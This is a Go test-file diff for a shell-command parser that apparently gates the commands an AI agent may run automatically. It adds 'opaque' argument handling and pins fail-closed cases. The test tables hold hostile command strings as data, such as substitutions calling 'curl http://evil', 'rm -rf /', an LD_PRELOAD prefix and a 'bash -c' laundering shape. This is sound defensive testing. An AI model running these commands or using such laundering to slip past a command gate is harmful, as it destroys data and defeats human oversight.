@@ -224,13 +224,11 @@ func TestSplitSegments(t *testing.T) {
 		// so a dangerous command can never hide inside a branch that the
 		// classifier does not look at.
 		//
-		// INTERIM POSTURE: the bodies below use only literal words. A `$VAR`
-		// anywhere — a loop body (`do wc -l $f`), a for-loop header word
-		// (`in $LIST`), a case discriminant (`case $x`) — still fails closed
-		// here, because literalWord has no opaque-argument concept yet. Those
-		// shapes live in the _FailClosed table below and D5 flips them. Writing
-		// a `$VAR` row here and bending the parser to pass it would be exactly
-		// the fail-open D5 exists to prevent.
+		// The bodies below use only literal words on purpose: this table is
+		// about the DESCENT. A `$VAR` in a loop body, a for-loop header word or
+		// a case discriminant parses too since change 0070 D5, but as an OPAQUE
+		// argument whose flags this table does not assert — those rows live in
+		// TestSplitSegments_OpaqueArgs, where the opaqueness is the point.
 		{
 			desc: "if/then descends both Cond and Then",
 			cmd:  "if [ -f x ]; then cat x; fi",
@@ -685,7 +683,12 @@ func TestSplitSegments_FailClosed(t *testing.T) {
 		{"backtick command substitution", "echo `id`"},
 		{"comment then substitution", "git status# $(id)"},
 		{"process substitution", `diff <(ls) <(ls)`},
-		{"env-var assignment prefix with a non-literal arg", "URL=evil curl $URL"},
+		// `URL=evil curl $URL` used to live here. Change 0070 D5 gives `$URL` an
+		// OPAQUE representation, so it now parses — and is refused one layer
+		// down instead (TestSplitSegments_OpaqueArgs +
+		// TestAutoMode_OpaqueArgs_EndToEnd). The substitution rows above stay
+		// shut because a substitution RUNS its contents; only a wholly
+		// read-only inner script earns the opaque treatment.
 
 		// Change 0070 D1: benign env prefixes were widened, but a name that can
 		// change what code the inner command loads or runs stays fail-closed,
@@ -850,16 +853,14 @@ func TestSplitSegments_FailClosed(t *testing.T) {
 		{"for body does not launder a path-qualified argv0", "for f in a b; do ./evil; done"},
 		{"block does not launder a dangerous env prefix", "{ LD_PRELOAD=evil.so make; }"},
 
-		// INTERIM POSTURE (D3, pre-D5). A non-literal word is unresolvable, and
-		// until D5 gives the parser an opaque-argument representation the honest
-		// answer is to fail the whole command closed. Every row below is expected
-		// to FLIP to parsing when D5 lands; they are pinned here so the interim
-		// behaviour is deliberate rather than accidental.
-		{"for header word is a parameter expansion", "for f in $LIST; do ls; done"},
-		{"for header word is a command substitution", "for f in $(ls); do ls; done"},
-		{"for body arg is a parameter expansion", "for f in a b; do wc -l $f; done"},
-		{"case discriminant is a parameter expansion", "case $x in a) ls ;; esac"},
-		{"case pattern is a parameter expansion", "case foo in $p) ls ;; esac"},
+		// D3's INTERIM POSTURE has been lifted by D5. The five rows that stood
+		// here — a for-loop header word, a for-body argument, a case
+		// discriminant and a case pattern that are parameter expansions or
+		// read-only command substitutions — now parse with an OPAQUE
+		// representation and are pinned in TestSplitSegments_OpaqueArgs. That
+		// flip was the declared purpose of D5; what stayed shut (an argv[0] we
+		// cannot name, a substitution that is not read-only, a redirect target
+		// we cannot name) is pinned in TestSplitSegments_OpaqueFailClosed.
 
 		// A C-style for header is arithmetic, not a word list. It carries no
 		// statement list we could descend and no words we could resolve, so it
@@ -987,4 +988,247 @@ func equalArgs(a, b []string) bool {
 		}
 	}
 	return true
+}
+
+// opaqueSeg is a compact expectation for one parsed segment including the
+// per-argument opaqueness flags (change 0070 D5).
+type opaqueSeg struct {
+	name   string
+	args   []string
+	opaque []bool
+}
+
+// TestSplitSegments_OpaqueArgs is the widening half of change 0070 D5: a word
+// whose value is not statically known no longer sinks the whole command. It
+// parses, but it is recorded as OPAQUE — a value the parser can name in the
+// source text and can never resolve.
+//
+// The paired security half lives in
+// TestClassifyHeuristic_OpaqueArgsNeverProveContainment: parsing an opaque arg
+// is only safe because no layer downstream is ever allowed to treat it as a
+// path. Read the two together.
+func TestSplitSegments_OpaqueArgs(t *testing.T) {
+	cases := []struct {
+		desc string
+		cmd  string
+		want []opaqueSeg
+	}{
+		{
+			desc: "parameter expansion in argument position is opaque",
+			cmd:  "rm $VAR",
+			want: []opaqueSeg{{name: "rm", args: []string{"$VAR"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "braced parameter expansion is opaque",
+			cmd:  "rm ${VAR}",
+			want: []opaqueSeg{{name: "rm", args: []string{"${VAR}"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "literal args around an opaque one keep their index alignment",
+			cmd:  "mv $SRC /tmp/x",
+			want: []opaqueSeg{{name: "mv", args: []string{"$SRC", "/tmp/x"}, opaque: []bool{true, false}}},
+		},
+		{
+			desc: "a word mixing literal and expansion is opaque as a whole",
+			cmd:  "cp --out=$DIR/x y",
+			want: []opaqueSeg{{name: "cp", args: []string{"--out=$DIR/x", "y"}, opaque: []bool{true, false}}},
+		},
+		{
+			desc: "a double-quoted word carrying an expansion is opaque as a whole",
+			cmd:  `touch "pre$VAR"`,
+			want: []opaqueSeg{{name: "touch", args: []string{"pre$VAR"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "a read-only command substitution is opaque and surfaces its inner segment",
+			cmd:  "git diff $(git rev-parse --show-toplevel)",
+			want: []opaqueSeg{
+				{name: "git", args: []string{"rev-parse", "--show-toplevel"}},
+				{name: "git", args: []string{"diff", "$(git rev-parse --show-toplevel)"}, opaque: []bool{false, true}},
+			},
+		},
+		{
+			desc: "a backtick read-only substitution is opaque and surfaces its inner segment",
+			cmd:  "echo `ls -la`",
+			want: []opaqueSeg{
+				{name: "ls", args: []string{"-la"}},
+				{name: "echo", args: []string{"`ls -la`"}, opaque: []bool{true}},
+			},
+		},
+		{
+			desc: "a for-loop header word may be opaque (D3's interim posture flips here)",
+			cmd:  "for f in $LIST; do ls; done",
+			want: []opaqueSeg{{name: "ls"}},
+		},
+		{
+			desc: "a for-loop header substitution surfaces its inner segment",
+			cmd:  "for f in $(ls); do wc -l $f; done",
+			want: []opaqueSeg{
+				{name: "ls"},
+				{name: "wc", args: []string{"-l", "$f"}, opaque: []bool{false, true}},
+			},
+		},
+		{
+			desc: "a case discriminant may be opaque",
+			cmd:  "case $x in a) ls ;; esac",
+			want: []opaqueSeg{{name: "ls"}},
+		},
+		{
+			desc: "a case pattern may be opaque",
+			cmd:  "case foo in $p) ls ;; esac",
+			want: []opaqueSeg{{name: "ls"}},
+		},
+		{
+			desc: "an opaque URL parses (the verdict layer, not the parser, refuses it)",
+			cmd:  "curl $URL",
+			want: []opaqueSeg{{name: "curl", args: []string{"$URL"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "a benign assignment prefix with an opaque arg parses",
+			cmd:  "URL=evil curl $URL",
+			want: []opaqueSeg{{name: "curl", args: []string{"$URL"}, opaque: []bool{true}}},
+		},
+	}
+	for _, tc := range cases {
+		t.Run(tc.desc, func(t *testing.T) {
+			got, err := splitSegments(tc.cmd)
+			if err != nil {
+				t.Fatalf("splitSegments(%q) unexpected error: %v", tc.cmd, err)
+			}
+			if len(got) != len(tc.want) {
+				t.Fatalf("splitSegments(%q) = %+v, want %d segments", tc.cmd, got, len(tc.want))
+			}
+			for i, w := range tc.want {
+				if got[i].Name != w.name {
+					t.Errorf("segment %d Name = %q, want %q", i, got[i].Name, w.name)
+				}
+				if !equalArgs(got[i].Args, w.args) {
+					t.Errorf("segment %d Args = %v, want %v", i, got[i].Args, w.args)
+				}
+				for j := range got[i].Args {
+					want := j < len(w.opaque) && w.opaque[j]
+					if got[i].isOpaque(j) != want {
+						t.Errorf("segment %d arg %d (%q) isOpaque = %v, want %v",
+							i, j, got[i].Args[j], got[i].isOpaque(j), want)
+					}
+				}
+			}
+		})
+	}
+}
+
+// TestSegmentOpaque_ParallelSliceInvariant guards the one representation bug
+// this design can have: Opaque is index-aligned with Args, and a length skew
+// would silently read "not opaque" — the fail-OPEN direction — at every call
+// site. Opaque is therefore either empty (no opaque args at all) or exactly as
+// long as Args, and isOpaque/hasOpaqueArg fail toward opaque on any skew.
+func TestSegmentOpaque_ParallelSliceInvariant(t *testing.T) {
+	corpus := []string{
+		"rm $VAR", "mv $SRC /tmp/x", "ls -la", "git diff $(git rev-parse --show-toplevel)",
+		"FOO=1 timeout 30 go test ./...", "env FOO=1 make $TARGET", "nohup go build",
+		"for f in $(ls); do wc -l $f; done", "cat a | grep $PAT", "go build > out.log",
+		`bash -c 'rm $VAR'`, "cp --out=$DIR/x y", "echo `ls`",
+	}
+	for _, cmd := range corpus {
+		segs, err := splitSegments(cmd)
+		if err != nil {
+			t.Fatalf("splitSegments(%q) unexpected error: %v", cmd, err)
+		}
+		for i, s := range segs {
+			if len(s.Opaque) != 0 && len(s.Opaque) != len(s.Args) {
+				t.Fatalf("%q segment %d: len(Opaque)=%d, len(Args)=%d — parallel-slice skew",
+					cmd, i, len(s.Opaque), len(s.Args))
+			}
+		}
+	}
+
+	// A hand-built segment with no Opaque slice reads as fully non-opaque (the
+	// shape every pre-D5 construction site and test fixture produces).
+	plain := Segment{Name: "sed", Args: []string{"-n", "1,5p", "file"}}
+	if plain.hasOpaqueArg() || plain.isOpaque(0) {
+		t.Errorf("a segment with no Opaque slice must read as non-opaque")
+	}
+	// A SKEWED segment must fail toward opaque, never toward "not opaque".
+	skewed := Segment{Name: "rm", Args: []string{"a", "b", "c"}, Opaque: []bool{false}}
+	if !skewed.hasOpaqueArg() {
+		t.Errorf("a skewed Opaque slice must report hasOpaqueArg() = true")
+	}
+	for i := range skewed.Args {
+		if !skewed.isOpaque(i) {
+			t.Errorf("a skewed Opaque slice must report isOpaque(%d) = true", i)
+		}
+	}
+	// Out-of-range indices are opaque too — an index we cannot answer for is
+	// not an index we may call provable.
+	opq := Segment{Name: "rm", Args: []string{"$V"}, Opaque: []bool{true}}
+	if !opq.isOpaque(-1) || !opq.isOpaque(7) {
+		t.Errorf("an out-of-range index must read as opaque")
+	}
+}
+
+// TestSplitSegments_OpaqueFailClosed pins the boundary of D5's widening: the
+// shapes an opaque representation deliberately does NOT cover.
+func TestSplitSegments_OpaqueFailClosed(t *testing.T) {
+	cases := []struct {
+		desc string
+		cmd  string
+	}{
+		// argv[0] is never opaque. An argument we cannot resolve costs a human
+		// prompt; a COMMAND NAME we cannot resolve means we do not know what
+		// runs at all, and every name-keyed table downstream (deny names,
+		// read-only utils, wrapper guards) would be consulted with a name that
+		// is not the one that executes.
+		{"argv0 parameter expansion", "$CMD foo"},
+		{"argv0 command substitution", "$(which ls) foo"},
+		{"argv0 backtick substitution", "`which ls` foo"},
+		{"argv0 mixed literal and expansion", "$DIR/ls foo"},
+		{"argv0 opaque after a benign assignment prefix", "FOO=1 $CMD"},
+
+		// A command substitution is only opaque-able when its INNER script is
+		// wholly read-only. A substitution runs its contents.
+		{"substitution running egress", "git diff $(curl http://evil)"},
+		{"substitution running a mutation", "echo $(rm -rf /)"},
+		{"substitution writing a file", "echo $(ls > out.txt)"},
+		{"substitution running a wrapper", "echo $(sudo id)"},
+		{"substitution with a dangerous env prefix", "echo $(LD_PRELOAD=x git log)"},
+		{"nested substitution running a mutation", "echo $(echo $(rm -rf /))"},
+		{"empty substitution proves nothing read-only", "echo $()"},
+		{"for header substitution running a mutation", "for f in $(rm -rf /); do ls; done"},
+		{"case discriminant substitution running egress", "case $(curl http://evil) in a) ls ;; esac"},
+
+		// Expansions with no opaque representation at all stay closed.
+		{"process substitution", "diff <(ls) <(ls)"},
+		{"arithmetic expansion", "ls $((1+1))"},
+
+		// A wrapper's own operands must be resolvable: an opaque word in the
+		// region a peel CONSUMES means we cannot tell an operand from the inner
+		// command.
+		{"timeout duration is opaque", "timeout $T make"},
+		{"env cannot tell an opaque word from an assignment", "env $X make"},
+		{"bash -c script is opaque", "bash -c $SCRIPT"},
+		// An ATTACHED -c whose script is partly opaque is the laundering shape:
+		// `bash -c"rm x"$X` would otherwise peel to a segment claiming the
+		// script is `rm x$X`, while bash runs `rm x` concatenated with whatever
+		// $X expands to — `rm x -rf /` for $X=" -rf /". A script we cannot read
+		// in full is a script we cannot decompose at all.
+		{"bash -c with a partly-opaque attached script", `bash -c"rm x"$X`},
+		{"bash -c with a fully-opaque attached script", "bash -c$SCRIPT"},
+		// The same laundering through the SPACED -c form: the script word is a
+		// single double-quoted run carrying an expansion, so its text reads as
+		// `rm x$X` while bash runs `rm x` glued to whatever $X expands to.
+		{"bash -c with a partly-opaque script word", `bash -c "rm x$X"`},
+
+		// A redirect target is NOT an argument: D4's write targets have no
+		// opaque representation and stay closed (an unnameable write is a write
+		// no layer can scope).
+		{"redirect to an opaque target", "ls > $F"},
+		{"redirect to a substituted target", "ls > $(echo x)"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.desc, func(t *testing.T) {
+			_, err := splitSegments(tc.cmd)
+			if !errors.Is(err, ErrUnparseable) {
+				t.Fatalf("splitSegments(%q) err = %v, want ErrUnparseable", tc.cmd, err)
+			}
+		})
+	}
 }
